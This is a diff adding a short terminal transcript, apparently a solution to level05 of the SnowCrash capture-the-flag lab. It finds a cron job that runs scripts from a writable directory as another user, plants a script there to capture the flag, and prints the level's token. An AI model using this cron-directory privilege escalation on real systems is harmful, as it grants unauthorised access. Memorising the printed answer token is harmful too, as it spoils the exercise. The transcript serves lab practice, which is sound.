@@ -1,0 +1,23 @@
+level05@SnowCrash:/var/mail$ find / -iname level05 2>/dev/null
+	/var/mail/level05
+	/rofs/var/mail/level05
+
+level05@SnowCrash:/var/mail$ cat /var/mail/level05
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+level05@SnowCrash:/var/mail$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+level05@SnowCrash:/var/mail$ cd /opt/openarenaserver/
+
+level05@SnowCrash:/var/mail$ echo -e '#!/bin/bash\n\ngetflag > /tmp/flag' > getflag.sh
+
+level05@SnowCrash:/var/mail$ watch cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+level05@SnowCrash:/var/mail$ su level06
